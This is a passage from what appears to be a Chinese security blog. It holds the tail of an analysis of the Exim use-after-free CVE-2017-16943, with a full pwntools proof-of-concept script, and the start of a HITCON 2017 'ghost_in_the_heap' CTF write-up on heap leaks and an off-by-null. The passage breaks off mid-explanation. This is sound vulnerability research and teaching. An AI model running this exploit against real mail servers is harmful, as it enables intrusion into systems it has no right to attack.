<p>然后是 <code>store_extend_3</code> 函数<br>首先会进行校验，要求 <code>store_last_get</code> 和 <code>next_yield</code> 要连续，也就是待合并的块与 <code>next_yield</code>  要紧挨着，类似于</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513260406403tt6u0txr.png?imageslim" alt="paste image"></p>
<p>而且剩余内存大小也要能满足需要</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513260445596wawuzkgx.png?imageslim" alt="paste image"></p>
<p>如果条件满足直接修改全局变量，切割内存块即可.</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513260486599jom5fys3.png?imageslim" alt="paste image"></p>
<p><code>store_release_3</code> 函数<br>找到目标地址所在 <code>block</code> ，然后调用 <code>free</code> 释放掉即可</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15132605729110y3w7k0o.png?imageslim" alt="paste image"></p>
<p>下面正式进入漏洞分析<br>漏洞位于 <code>receive.c</code> 的 <code>receive_msg</code> 函数。</p>
<p>漏洞代码</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513260852552v7wf4k6r.png?imageslim" alt="paste image"></p>
<p>这个函数用于处理客户端提交的 <code>exim</code> 命令， <code>ptr</code> 表示当前以及接收的命令的字符数， <code>header_size</code> 为一个 阈值，初始为 <code>0x100</code> , 当 <code>ptr</code> &gt; <code>header_size-4</code> 时， <code>header_size</code>翻倍，然后扩展内存，以存储更多的字符串。</p>
<p>如果 <code>next-&gt;text</code> 与 <code>next_yield</code> 之间有另外的内存分配，或者 <code>next-&gt;text</code> 所在块没有足够的空间用来扩展，就会使用 <code>store_get</code> 获取内存，如果空间不够，就会调用 <code>malloc</code> 分配内存，然后复制内容到新分配的内存区域，最后释放掉原来的内存区域。</p>
<p>一切都看起来很平常，下面看看漏洞的原理。</p>
<p><code>store_get</code> 分配到的是 <code>block</code>中的一小块内存（<code>store</code>）, 然而 <code>store_release_3</code> 则会释放掉 一整个 <code>block</code> 的内存。<br>如果我们在进入该流程时，把 <code>block</code> 布局成类似这样.</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15132995469411a9h83rg.png?imageslim" alt="paste image"></p>
<p>因为 <code>next-&gt;text</code>  和 空闲块之间 有内存的分配，所以 <code>store_extend_3</code> 就会失败，进入 <code>store_get</code> 分配内存.</p>
<p>如果 <code>free memory</code> 区域内存能够满足需要， 那么就会从 <code>free memory</code> 区域 切割内存返回，然后会拷贝内容，最后 <code>store_release(next-&gt;text)</code>, 此时会把 整个 <code>block</code> 释放掉，这样一来 <code>next-&gt;text</code> ,<code>current_block</code> 都指向了一块已经释放掉的内存，如果以后有使用到这块内存的话, 就是 <code>UAF</code> 了。</p>
<p>大概流程如下<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1513299429816blx4y8vg.png?imageslim" alt="paste image"><br>接下来，分析一下 <code>poc</code>.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div></pre></td><td class="code"><pre><div class="line"># CVE-2017-16943 PoC by meh at DEVCORE</div><div class="line"># pip install pwntools</div><div class="line">from pwn import *</div><div class="line"></div><div class="line">context.log_level = &apos;debug&apos;</div><div class="line"></div><div class="line">r = remote(&apos;localhost&apos;, 25)</div><div class="line"></div><div class="line">r.recvline()</div><div class="line">r.sendline(&quot;EHLO test&quot;)</div><div class="line">r.recvuntil(&quot;250 HELP&quot;)</div><div class="line">r.sendline(&quot;MAIL FROM:&lt;&gt;&quot;)</div><div class="line">r.recvline()</div><div class="line">r.sendline(&quot;RCPT TO:&lt;meh@some.domain&gt;&quot;)</div><div class="line">r.recvline()</div><div class="line"></div><div class="line"></div><div class="line">pause()</div><div class="line"></div><div class="line">r.sendline(&apos;a&apos;*0x1280+&apos;\x7f&apos;)</div><div class="line"></div><div class="line">log.info(&quot;new heap on top chunk....&quot;)</div><div class="line">pause()</div><div class="line"></div><div class="line"></div><div class="line">r.recvuntil(&apos;command&apos;)</div><div class="line">r.sendline(&apos;DATA&apos;)</div><div class="line">r.recvuntil(&apos;itself\r\n&apos;)</div><div class="line">r.sendline(&apos;b&apos;*0x4000+&apos;:\r\n&apos;)</div><div class="line">log.info(&quot;use DATA to create unsorted bin, next want to let next-&gt;txt ----&gt; block_base&quot;)</div><div class="line">pause()</div><div class="line"></div><div class="line"></div><div class="line">r.sendline(&apos;.\r\n&apos;)</div><div class="line">r.sendline(&apos;.\r\n&apos;)</div><div class="line">r.recvline()</div><div class="line">r.sendline(&quot;MAIL FROM:&lt;&gt;&quot;)</div><div class="line">r.recvline()</div><div class="line">r.sendline(&quot;RCPT TO:&lt;meh@some.domain&gt;&quot;)</div><div class="line">r.recvline()</div><div class="line">r.sendline(&apos;a&apos;*0x3480+&apos;\x7f&apos;)</div><div class="line"></div><div class="line">log.info(&quot;new heap on top chunk....  again&quot;)</div><div class="line">pause()</div><div class="line"></div><div class="line"></div><div class="line">r.recvuntil(&apos;command&apos;)</div><div class="line">r.sendline(&apos;BDAT 1&apos;)</div><div class="line">r.sendline(&apos;:BDAT \x7f&apos;)</div><div class="line"></div><div class="line">log.info(&quot;make hole&quot;)</div><div class="line">pause()</div><div class="line"></div><div class="line"></div><div class="line">s = &apos;a&apos;*0x1c1e + p64(0x41414141)*(0x1e00/8)</div><div class="line"></div><div class="line">r.send(s+ &apos;:\r\n&apos;)</div><div class="line">r.send(&apos;\n&apos;)</div><div class="line">r.interactive()</div></pre></td></tr></table></figure>
<p>漏洞利用的原理在于，<code>block</code> 结构体的 <code>next</code> 和 <code>length</code>域恰好位于 <code>malloc chunk</code> 的 <code>fd</code> 和 <code>bk</code> 指针区域，如果我们能在触发漏洞时把 这个 <code>chunk</code> 放到 <code>unsorted bin</code> 中，<code>block</code> 结构体的 <code>next</code> 和 <code>length</code>就会变成 <code>main_arena</code> 中的地址，然后再次触发 <code>store_get</code> ，就会从 <code>main_arena</code> 中切割内存块返回给我们，我们就能修改 <code>main_arena</code>  中的数据了。可以改掉 <code>__free_hook</code> 来控制 <code>eip</code>.</p>
<p>继续往下之前，还有一个点需要说一下。</p>
<p>当 <code>exim</code> 获得客户端连接后，首先调用 <code>smtp_setup_msg</code> 获取命令，如果获取到的是 <strong>无法识别</strong> 的命令，就会调用 <code>string_printing</code> 函数。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1513301558543vaj00d9h.png?imageslim" alt="paste image"></p>
<p>这个函数内部会调用 <code>store_get</code> 保存字符串.</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15133016051358khgbdml.png?imageslim" alt="paste image"><br>所以我们可以通过这个 <code>tips</code> 控制一定的内存分配。</p>
<p>下面通过调试，看看 <code>poc</code> 的流程。</p>
<p>首先通过发送 无法识别的命令，分配一块大内存，与 <code>top chunk</code> 相邻<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">r.sendline(&apos;a&apos;*0x1280+&apos;\x7f&apos;)</div></pre></td></tr></table></figure></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15133020345637juhli14.png?imageslim" alt="paste image"><br>可以看到此时 <code>current_block</code> 中剩下的长度为 <code>0x11b0</code>，而请求的长度 <code>0x1285</code> , 所以会通过 <code>malloc</code> 从系统分配内存，然后在切割返回。执行完后看看堆的状态</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513302261849xvq2lji2.png?imageslim" alt="paste image"></p>
<p>可以看到，现在的 <code>current_block</code> 的指针就是上一步的 <code>top chunk</code> 的地址，而且现在 <code>current_block</code> 和  <code>top chunk</code> 是相邻的。通过计算可以知道共分配了 <code>0x1288</code> 字节（内存对齐）</p>
<p>然后通过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">r.sendline(&apos;b&apos;*0x4000+&apos;:\r\n&apos;)</div></pre></td></tr></table></figure></p>
<p>构造非常大的 <code>unsorted bin</code>, 原因在于，他这个是先 <code>分配</code> 再 <code>free</code> 的，由于 <code>0x4000</code> 远大于 <code>header_size</code> 的初始值（0x100）, 这样就会触发多次的 <code>store_get</code>, 而且 <code>0x4000</code> 也大于 <code>block</code> 的默认大小（0x2000）, 所以也会触发多次的 <code>malloc</code> ， 在 <code>malloc</code> 以后，会调用 <code>store_release</code> 释放掉之前的块，然后由于这个释放的块和 <code>top chunk</code> 之间有正在使用的块(刚刚调用<code>store_get</code>分配的），所以不会与<code>top chunk</code> 合并，而会把 它放到 <code>unsorted bin</code> 中 ，这样多次以后就会构造一个比较大的 <code>unsorted bin</code>.<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1513302702234g88jsg0k.png?imageslim" alt="paste image"></p>
<p>第一次调用 <code>store_get</code>，进行扩展，可以看到 请求 <code>0x1000</code>, 但是剩余的只有 <code>0x548</code>, 所以会调用 <code>malloc</code> 分配。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513303590249170ixrvk.png?imageslim" alt="paste image"><br>单步步过，查看堆的状态，发现和预期一致</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513303724246jvwjulr8.png?imageslim" alt="paste image"></p>
<p><code>store_release(next-&gt;text)</code> 之后就有 <code>unsorted bin</code>.<img src="http://oy9h5q2k4.bkt.clouddn.com/151330416633134eomvaf.png?imageslim" alt="paste image"><br>多次以后，就会有一个非常大的 <code>unsorted bin</code><br><img src="http://oy9h5q2k4.bkt.clouddn.com/1513304236832mizmzou3.png?imageslim" alt="paste image"><br>接下来使用 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">r.sendline(&apos;a&apos;*0x3480+&apos;\x7f&apos;)</div></pre></td></tr></table></figure>
<p>再次分配一块大内存内存，使得 <code>yield_length &lt; 0x100</code>， 分配完后 <code>yield_length</code> 变成了 <code>0xa0</code>。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/15133050992775d244gih.png?imageslim" alt="paste image"></p>
<p>下面使用<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1513305227882r3xou0k6.png?imageslim" alt="paste image"></p>
<p>然后会进入 <code>receive_msg</code><br><img src="http://oy9h5q2k4.bkt.clouddn.com/1513305343174he2e9xy6.png?imageslim" alt="paste image"></p>
<p>首先会分配一些东西。上一步 <code>yield_length</code> 变成了 <code>0xa0</code>， 前面两个都比较小， <code>current_block</code> 可以满足需求。后面的<code>next-&gt;text = store_get(header_size)</code>, header_size最开始 为 0x100, 所以此时会重新分配一个 <code>block</code>，并且 <code>next-&gt;text</code> 会位于 <code>block</code> 的开始。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513305821535dxt8bw6a.png?imageslim" alt="paste image"></p>
<p>符合预期。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">r.sendline(&apos;:BDAT \x7f&apos;)</div></pre></td></tr></table></figure>
<p>触发 <code>string_printing</code>,分配一小块内存。此时的 <code>current_block</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513306252691g22wjttm.png?imageslim" alt="paste image"></p>
<p>之后触发漏洞。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15133062969665oyu1sko.png?imageslim" alt="paste image"></p>
<p>当触发 漏洞代码时， <code>store_extend</code> 会出错，因为 <code>next-&gt;text</code> 和空闲内存之间有在使用的内存。于是会触发 <code>store_get(header_size)</code> ,因为此时 空闲块的空间比较大 （0x1ee0）, 所以会直接切割内存返回，然后 <code>store_release</code> 会释放这块内存。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/151330818058602ut39gp.png?imageslim" alt="paste image"></p>
<p>可以看到<code>current_block</code> 被 <code>free</code> 并且被放到了 <code>unsorted bin</code>, 此时 <code>current_block</code> 的 <code>next</code>  和 <code>length</code>  变成了 <code>main_arena</code> 的地址（可以看看之前  block的结构图）<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1513308325076mi9vpvsh.png?imageslim" alt="paste image"></p>
<p>当再次触发 <code>store_get</code>, 会遍历 <code>block-&gt;next</code>, 拿到 <code>main_arena</code>, 然后切割内存分配给我们<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1513308508292aqt1i61a.png?imageslim" alt="paste image"></p>
<p>之后的 <code>memcpy</code>我们就可以修改<code>main_arena</code>的数据了。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/151330875243837hyzkwi.png?imageslim" alt="paste image"></p>
<p><code>getshell</code> 请看参考链接。（因为我没成功~_~）</p>
<p><strong>参考</strong></p>
<p><a href="https://devco.re/blog/2017/12/11/Exim-RCE-advisory-CVE-2017-16943-en/" target="_blank" rel="external">https://devco.re/blog/2017/12/11/Exim-RCE-advisory-CVE-2017-16943-en/</a></p>
<p><a href="https://paper.seebug.org/469/" target="_blank" rel="external">https://paper.seebug.org/469/</a></p>
<p><a href="https://paper.seebug.org/479/" target="_blank" rel="external">https://paper.seebug.org/479/</a></p>
<p><a href="https://bugs.exim.org/show_bug.cgi?id=2199" target="_blank" rel="external">https://bugs.exim.org/show_bug.cgi?id=2199</a></p>
]]></content>
      
        <categories>
            
            <category> Vulnerability analysis </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CVE-2017-16943 </tag>
            
            <tag> exim_uaf </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Pwn with File结构体（三）]]></title>
      <url>/2017/12/12/pwn_with_file_part3.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><hr>
<p>本文由 <strong>本人</strong> 首发于 先知安全技术社区：  <a href="https://xianzhi.aliyun.com/forum/user/5274" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/user/5274</a></p>
<hr>
<p>前面介绍了几种 <code>File</code> 结构体的攻击方式，其中包括修改 <code>vtable</code>的攻击，以及在最新版本 <code>libc</code> 中 通过 修改 <code>File</code> 结构体中的一些缓冲区的指针来进行攻击的例子。</p>
<p>本文以 <code>hitcon 2017</code> 的 <code>ghost_in_the_heap</code> 为例子，介绍一下在实际中的利用方式。</p>
<p>不过我觉得这个题的精华不仅仅是在最后利用 <code>File</code> 结构体 <code>getshell</code> 那块， 前面的通过堆布局，<code>off-by-null</code> 进行堆布局的部分更是精华中的精华，通过这道题可以对 <code>ptmalloc</code> 的内存分配机制有一个更加深入的了解。</p>
<p>分析的 <code>idb</code> 文件，题目，exp:</p>
<p><a href="https://gitee.com/hac425/blog_data/tree/master/pwn_file" target="_blank" rel="external">https://gitee.com/hac425/blog_data/tree/master/pwn_file</a></p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>拿到一道题，首先看看保护措施，这里是全开。然后看看所给的各个功能的作用。</p>
<ul>
<li><code>new_heap</code>, 最多分配 3个 <code>0xb0</code> 大小的chunk ( <code>malloc(0xA8)</code>)然后可以输入 <code>0xa8</code>个字符，注意调用的 <code>_isoc99_scanf(&quot;%168s&quot;, heap_table[i]);</code> 会在输入串的末尾 添 <code>\x00</code>, 可以 <code>off-by-one</code>.</li>
<li><code>delete_heap</code> free掉指定的 heap</li>
<li><code>add_ghost</code> 最多分配一个 <code>0x60</code> 的 chunk (<code>malloc(0x50)</code>), 随后调用 <code>read</code> 获取输入，末尾没有增加 <code>\x00</code> ,可以 <code>leak</code></li>
<li><code>watch_ghost</code> 调用 <code>printf</code> 打印 <code>ghost</code> 的内容</li>
<li><code>remove_ghost</code>  free掉 <code>ghost</code> 指针</li>
</ul>
<p>总结一下， 我们可以 最多分配 3个 <code>0xb0</code> 大小的 <code>chunk</code>， 以及 一个 <code>0x60</code> 的 <code>chunk</code>，然后 在 分配 <code>heap</code> 有 <code>off-by-one</code> 可以修改下一块的 <code>size</code> 位（细节后面说）， 分配 <code>ghost</code> 时，在输入数据后没有在数据末尾添 <code>\x00</code> ，同时有一个可以获取 <code>ghost</code> 的函数，可以 <code>leak</code> 数据。</p>
<p>有一个细节需要提一下：</p>
<p>在程序中 <code>new_heap</code> 时是通过 <code>malloc(0xa8)</code>, 这样系统会分配 <code>0xb0</code> 字节的 <code>chunk</code>, 原因是对齐导致的， 剩下需要的那8个字节由下一个堆块的 <code>pre_size</code> 提供。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15130630121102mpker2n.png?imageslim" alt="paste image"><br><code>0x5555557571c0</code> 是一个 <code>heap</code> 所在 <code>chunk</code> 的基地址， 他分配了 <code>0xb0</code> 字节，位于 <code>0x555555757270</code> 的 8 字节也是给他用的。</p>
<p><strong>信息泄露绕过 aslr &amp;&amp; 获得 heap 和 libc 的地址</strong></p>
<p>先放一张信息泄露的草图压压惊</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15130538118666xsytph2.png?imageslim" alt="paste image"></p>
<p>在堆中进行信息泄露我们可以充分利用堆的分配机制，在堆的分配释放过程中会用到双向链表，这些链表就是通过 <code>chunk</code> 中的指针链接起来的。如果是 <code>bin</code> 的第一个块里面的指针就全是 <code>libc</code> 中的地址，如果 <code>chunk</code> 所属的 <code>bin</code> 有多个 <code>chunk</code> 那么<code>chunk</code> 中的指针就会指向 <code>heap</code> 中的地址。 利用这两个 <code>tips</code> , 加上上面所说的 ，  <code>watch_ghost</code>可以 <code>leak</code> 内存中的数据，再通过精心的堆布局，我们就可以拿到 <code>libc</code> 和 <code>heap</code> 的基地址</p>
<p>回到这个题目来看，我们条件其实是比较苛刻的，我们只有 <code>ghost</code> 的内存是能够读取的。而 分配 <code>ghost</code> 所得到的 <code>chunk</code> 的大小是 <code>0x60</code> 字节的，这是在 <code>fastbin</code> 的大小范围的， 所以我们释放后，他会进入 <code>fastbin</code> ,由于该<code>chunk</code>是其 所属 <code>fastbin</code> 的第一项， 此时 <code>chunk-&gt;fd</code> 会被设置为 <code>0</code>,  <code>chunk-&gt;bk</code> 内容不变。</p>
<p>测试一下即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">add_ghost(12345, &quot;s&quot;*0x20)</div><div class="line">new_heap(&quot;s&quot;)</div><div class="line">remove_ghost()</div></pre></td></tr></table></figure></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513055921831mi7kjy5z.png?imageslim" alt="paste image"></p>
<p>所以单单靠 <code>ghost</code> 是不能实现信息泄露的。</p>
<p>下面看看正确的思路。</p>
<p><strong>leak libc</strong></p>
<p>首先<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">add_ghost(12345, &quot;ssssssss&quot;)</div><div class="line">new_heap(&quot;b&quot;)   # heap 0</div><div class="line">new_heap(&quot;b&quot;)   # heap 1   </div><div class="line">new_heap(&quot;b&quot;)   # heap 2</div><div class="line"></div><div class="line"># ghost ---&gt; fastbin (0x60)</div><div class="line">remove_ghost()</div><div class="line">del_heap(0)</div></pre></td></tr></table></figure></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/151305653826347lnu79m.png?imageslim" alt="paste image"></p>
<p>然后</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">del_heap(2)  #触发 malloc cosolidate ， 清理 fastbin --&gt; unsorted, 此时 ghost + heap 0 合并</div></pre></td></tr></table></figure>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513056836802uafbdk5q.png?imageslim" alt="paste image"></p>
<p>可以看到 <code>fastbin</code> 和 <code>unsorted bin</code> 合并了，具体原因在 <code>_int_free</code> 函数的代码里面。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513056961189b78zrtlx.png?imageslim" alt="paste image"></p>
<p><code>FASTBIN_CONSOLIDATION_THRESHOLD</code> 的值为 <code>0x10000</code> ,当 <code>free</code>掉  <code>heap2</code> 后，会和 <code>top chunnk</code> 合并，此时的 <code>size</code> 明显大于  <code>0x10000</code>， 所以会进入 <code>malloc_consolidate</code> 清理 <code>fastbin</code> ,所以会和<code>unsorted bin</code> 合并形成了大的 <code>unsorted bin</code>. </p>
<p>然后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">new_heap(&quot;b&quot;)   # heap 0, 切割上一步生成的 大的 unsorted bin, 剩下 0x60 , 其中包含 main_arean 的指针</div><div class="line">add_ghost(12345, &quot;ssssssss&quot;)  # 填满 fd 的 8 个字节， 调用 printf 时就会打印 main_arean 地址</div></pre></td></tr></table></figure></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513057843165e2wv43ea.png?imageslim" alt="paste image"></p>
<p>先分配 <code>heap</code> 得到 <code>heap_0</code>, 此时原来的 <code>unsorted bin</code> 被切割， 剩下一个小的的 <code>unsorted bin</code>, 其中有指针 <code>fd</code>, <code>bk</code> 都是指向 <code>main_arean</code>, 然后我们在 分配一个 <code>ghost</code> ，填满 <code>fd</code> 的 <code>8</code> 个字节， 然后调用 <code>printf</code>时就会打印 <code>main_arean</code> 地址。</p>
<p>调试看看。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513059144543s1cj722q.png?imageslim" alt="paste image"></p>
<p><code>0x00005555557570c0</code> 是 <code>add_ghost</code> 返回的地址，然后使用 <code>watch_ghost</code>  就能 <code>leak libc</code> 的地址了。具体可以看文末的 <code>exp</code></p>
<p><strong>leak heap</strong></p>
<p>如果要 <code>leak heap</code> 的地址，我们需要使某一个 <code>bin</code>中有两个 <code>chunk</code>, 这里选择构造两个 <code>unsorted bin</code>.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">new_heap(&quot;b&quot;)   # heap 2</div><div class="line"></div><div class="line">remove_ghost()</div><div class="line">del_heap(0)</div><div class="line">del_heap(2)  # malloc cosolidate ， 清理 fastbin --&gt; unsorted, 此时 ghost + heap 0 合并</div></pre></td></tr></table></figure>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513059632175y6rm23it.png?imageslim" alt="paste image"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">new_heap(&quot;b&quot;)   # heap 0</div><div class="line">new_heap(&quot;b&quot;)   # heap 2</div><div class="line"># |unsorted bin 0xb0|heap 1|unsorted bin 0x60|heap 2|top chunk|</div><div class="line"># 两个 unsorted bin  使用双向链表，链接到一起</div><div class="line">del_heap(1)</div><div class="line">new_heap(&quot;b&quot;)   # heap 1 </div><div class="line">del_heap(0)</div></pre></td></tr></table></figure>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513060635255jf7cl5sx.png?imageslim" alt="paste image"><br>构造了两个 <code>unsorted bin</code>, 当 <code>add_ghost</code> 时就会拿到 下面那个 <code>unsorted bin</code>, 它的 <code>bk</code> 时指向 上面那个 <code>unsorted bin</code> 的，这样就可以 <code>leak heap</code> 了，具体看代码（这一步还有个小 <code>tips</code>, 代码里有）。</p>
<p>我们来谈谈 第一步到第二步为啥会出现 <code>smallbin</code> ,内存分配时，首先会去 <code>fastbin</code> , <code>smallbin</code> 中分配内存，不能分配就会 遍历· <code>unsorted bin</code>, 然后再去 <code>smallbin</code> 找。</p>
<p>具体流程如下( <a href="http://brieflyx.me/2016/heap/glibc-heap/" target="_blank" rel="external">来源</a> )：</p>
<ul>
<li><p>逐个迭代 <code>unsorted bin</code>中的块，如果发现 <code>chunk</code> 的大小正好是需要的大小，则迭代过程中止，直接返回此块;否则将此块放入到对应的 <code>small bin</code> 或者 <code>large bin</code> 中，这也是整个 <code>heap</code> 管理中唯一会将 <code>chunk</code> 放入 <code>small bin</code> 与 <code>large bin</code> 中的代码。</p>
</li>
<li><p>迭代过程直到 <code>unsorted bin</code> 中没有 <code>chunk</code> 或超过最大迭代次数( <code>10000</code> )为止。</p>
</li>
<li>随后开始在 <code>small bins</code> 与 <code>large bins</code> 中寻找 <code>best-fit</code>，即满足需求大小的最小块，如果能够找到，则分裂后将前一块返回给用户，剩下的块放入 <code>unsorted bin</code> 中。</li>
<li>如果没能找到，则回到开头，继续迭代过程，直到 <code>unsorted bin</code> 空为止</li>
</ul>
<p>所以在第一次 <code>new heap</code> 时 ，<code>unsorted bin</code>进入 <code>smallbin</code> ,然后 被切割，剩下一个 <code>0x60</code> 的<code>unsorted bin</code> ， 再次 <code>new heap</code> ，<code>unsorted bin</code>进入 <code>smallbin</code>，然后在分配 <code>new heap</code> 需要的内存 <code>0xb0</code> , 然后会从 <code>top chunk</code> 分配，于是 出现了 <code>smallbin</code>。</p>
<p>下面继续</p>
<p><strong>构造exploit之 off-by-one</strong></p>
<p>经过上一步我们已经 拿到了 <code>libc</code> 和 <code>heap</code> 的地址。下面讲讲怎么 <code>getshell</code><br>首先清理一下 <code>heap</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">remove_ghost()</div><div class="line">del_heap(1)</div><div class="line">del_heap(2)</div></pre></td></tr></table></figure></p>
<p>然后初始化一下堆状态<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">add_ghost(12345, &quot;ssssssss&quot;)</div><div class="line">new_heap(&quot;b&quot;)   # heap 0</div><div class="line">new_heap(&quot;b&quot;)   # heap 1   </div><div class="line">new_heap(&quot;b&quot;)   # heap 2</div></pre></td></tr></table></figure></p>
<p>现在的 <code>heap</code> 是这样的</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513061917788zaualfd9.png?imageslim" alt="paste image"></p>
<p>然后构建一个较大的 <code>unsorted bin</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">remove_ghost()</div><div class="line">del_heap(0)</div><div class="line">del_heap(2)</div><div class="line">new_heap(&quot;s&quot;)</div><div class="line">new_heap(&quot;s&quot;)</div><div class="line">log.info(&quot;create unsorted bin: |heap 0|unsorted_bin(0x60)|heap 1|heap 2|top chunk|&quot;)</div><div class="line"># pause()</div><div class="line"></div><div class="line">del_heap(0)</div><div class="line">del_heap(1)</div></pre></td></tr></table></figure></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15130621045925vya3mql.png?imageslim" alt="paste image"></p>
<p>下面使用 <code>off-by-null</code> 进行攻击，先说说这种攻击为啥可以实现，文章开头就说， <code>new_heap</code> 时获取输入，最多可以读取 <code>0xa8</code> 个字节的数据，最后会在末尾添加 <code>0x00</code> ,所以实际上是 <code>0xa9</code> 字节 , 因为  <code>0xa8</code> 字节 时已经用完了 下一个 <code>chunk</code> 的 <code>presize</code> 区域 ， 第<code>0xa9</code>字节就会覆盖 下一个 <code>chunk</code> 的 <code>size</code> 位， 这就是 <code>off-by-null</code>, 具体细节比较复杂，下面一一道来。</p>
<p>首先触发 <code>off-by-one</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">new_heap(&quot;a&quot;*0xa8)</div></pre></td></tr></table></figure>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513063756553bwp90599.png?imageslim" alt="paste image"></p>
<p>可以看到，在调用 <code>malloc</code> 分配内存后， <code>heap_0</code> 在 <code>heap</code>  的开头分配，然后在 偏移 <code>0xb0</code> 位置处有一个 <code>0x110</code> 大小的 <code>unsorted bin</code>，  此时 <code>heap_2</code> 的 <code>pre_size</code> 为 <code>0x110</code>,  <code>pre_inuse</code> 为 <code>0</code>。所以通过 <code>heap_2</code>  找到的 <code>pre chunk</code> 为 <code>0xb0</code> 处开始的 <code>0x110</code> 大小的 <code>chunk</code>.</p>
<p>然后 <code>off-by-null</code> 后， <code>unsorted bin</code> 的 <code>size</code> 域 变成了 <code>0x100</code> 这就造成了 <code>0x10</code> 大小的 <code>hole</code>.</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/151306437410482kehtxq.png?imageslim" alt="paste image"></p>
